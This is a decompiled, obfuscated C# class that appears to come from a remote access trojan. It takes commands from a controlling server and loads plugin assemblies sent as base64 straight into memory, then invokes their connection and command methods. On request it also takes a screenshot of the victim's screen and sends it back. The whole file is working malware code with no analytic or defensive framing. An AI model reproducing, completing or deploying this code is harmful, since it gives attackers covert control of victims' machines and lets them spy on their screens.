using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns1;
using ns2;
using ns4;
using ns7;
using ns8;

namespace ns6;

public class GClass5
{
	private static object object_0 = GClass3.string_4;

	public static void smethod_0(byte[] byte_0)
	{
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e7: Expected O, but got Unknown
		try
		{
			GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"OK", object_0), (object)GClass1.smethod_5()), object_0), GClass1.smethod_1())));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string[] array = Strings.Split(Conversions.ToString(GClass7.smethod_1(Class0.smethod_1(byte_0))), Conversions.ToString(object_0), -1, (CompareMethod)0);
		try
		{
			switch (array[0])
			{
			case "IPLM":
			{
				byte[] byte_3 = Convert.FromBase64String(array[1]);
				bool bool_ = false;
				smethod_1(Class0.smethod_7(byte_3, ref bool_), array[2]);
				break;
			}
			case "IPL":
			{
				Class0.smethod_4(array[2], array[1]);
				byte[] byte_2 = Convert.FromBase64String(Class0.smethod_3(array[2]));
				bool bool_ = false;
				smethod_1(Class0.smethod_7(byte_2, ref bool_));
				break;
			}
			case "CPL":
			{
				if (Operators.CompareString(Class0.smethod_3(array[1]), (string)null, false) == 0)
				{
					GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"GPL", object_0), (object)array[1])));
					break;
				}
				byte[] byte_ = Convert.FromBase64String(Class0.smethod_3(array[1]));
				bool bool_ = false;
				smethod_1(Class0.smethod_7(byte_, ref bool_));
				break;
			}
			case "!CAP":
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
					val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
					MemoryStream memoryStream = new MemoryStream();
					Bitmap val3 = new Bitmap(256, 156);
					Graphics val4 = Graphics.FromImage((Image)(object)val3);
					val4.DrawImage((Image)(object)val, new Rectangle(0, 0, 256, 156), new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height()), (GraphicsUnit)2);
					((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					GClass6.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"#CAP", object_0), GClass1.smethod_0()), object_0), (object)Encoding.Default.GetString(memoryStream.ToArray()))));
					try
					{
						val2.Dispose();
						memoryStream.Dispose();
						((Image)val3).Dispose();
						val4.Dispose();
						((Image)val).Dispose();
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					break;
				}
			case "!P":
				GClass6.bool_1 = true;
				break;
			case "!PSend":
				GClass6.bool_2 = true;
				GClass6.smethod_3("!PStart");
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1(byte[] byte_0, string string_0 = null)
	{
		try
		{
			Type[] types = AppDomain.CurrentDomain.Load(byte_0).GetTypes();
			for (int i = 0; i < types.Length; i = checked(i + 1))
			{
				MethodInfo[] methods = types[i].GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (Operators.CompareString(methodInfo.Name, "CN", false) == 0)
					{
						methodInfo.Invoke(null, new object[9]
						{
							GClass3.string_1,
							GClass3.int_0,
							GClass6.string_0,
							GClass6.string_1,
							GClass3.string_2,
							GClass3.object_0,
							GClass1.smethod_5(),
							GClass1.smethod_0(),
							GClass7.smethod_1(GClass3.string_0)
						});
					}
					else if (Operators.CompareString(methodInfo.Name, "MISC", false) == 0)
					{
						methodInfo.Invoke(null, new object[2]
						{
							GClass1.smethod_5(),
							string_0
						});
					}
					else if (Operators.CompareString(methodInfo.Name, "CL", false) == 0)
					{
						methodInfo.Invoke(null, new object[6]
						{
							GClass3.bool_3,
							GClass3.string_5,
							GClass3.object_0,
							GClass1.smethod_11(),
							GClass1.smethod_5(),
							string_0
						});
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass6.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"Plugin Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}
}
